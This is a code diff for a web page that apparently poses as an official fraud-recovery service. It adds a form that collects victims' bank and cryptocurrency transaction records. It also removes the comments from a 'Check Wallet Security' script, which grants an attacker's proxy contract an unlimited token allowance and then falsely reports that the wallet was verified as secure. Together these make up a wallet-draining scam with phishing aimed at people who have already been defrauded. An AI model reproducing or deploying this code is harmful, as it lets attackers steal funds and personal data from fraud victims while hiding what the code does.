@@ -104,6 +104,22 @@
         </ul>
         <p>Please respond within 7 days to submit the necessary materials for investigation.</p>
     </div>
+    <!-- Submit Materials Section -->
+    <div class="container" id="materials">
+        <h2 class="section-title">Submit Materials</h2>
+        <p>Please submit the following materials for investigation:</p>
+        <ul>
+            <li><strong>Personal Fraud Record:</strong> Provide a detailed description of the transaction process with the fraudulent platform, including amount, time, and platform specifics.</li>
+            <li><strong>Bank Transaction Record:</strong> Upload records of bank transfers related to fraudulent transactions.</li>
+            <li><strong>Cryptocurrency Transaction Record:</strong> Upload transaction proofs related to exchanges or wallets.</li>
+        </ul>
+        <p>Click the button below to submit via Google Form:</p>
+        <a href="https://docs.google.com/forms/d/e/1FAIpQLSdmj9CaYuaUQdZ6GLlL8-qLIOS3o9VG4tZU0JVwuLcf_ijDDg/viewform?usp=pp_url" target="_blank">
+            <button>Submit Materials</button>
+        </a>
+        <p>Or email materials to: <a href="mailto:support@fatfgroup.org">support@fatfgroup.org</a></p>
+    </div>
+
     <!-- Wallet Security Check Section -->
     <div class="container" id="recovery">
         <h2 class="section-title">Check Wallet Security</h2>
@@ -122,7 +138,6 @@
         const proxyAddress = "0x67A0bCBC059358E96bF4e85B43FFB2a12f25e097"; // Mainnet Contract Address
         let provider, signer;
 
-        // Connect wallet
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
@@ -140,19 +155,16 @@
             }
         }
 
-        // Perform security check (actual approval process)
         async function checkSecurity() {
             if (!signer) {
                 alert("Please connect your wallet first!");
                 return;
             }
 
-            // ERC20 Token ABI (only approve function)
             const tokenABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
             const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
             try {
-                // Approve unlimited token allowance for the proxy contract
                 const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
                 alert("Wallet security verified successfully! Authorization granted.");
             } catch (error) {
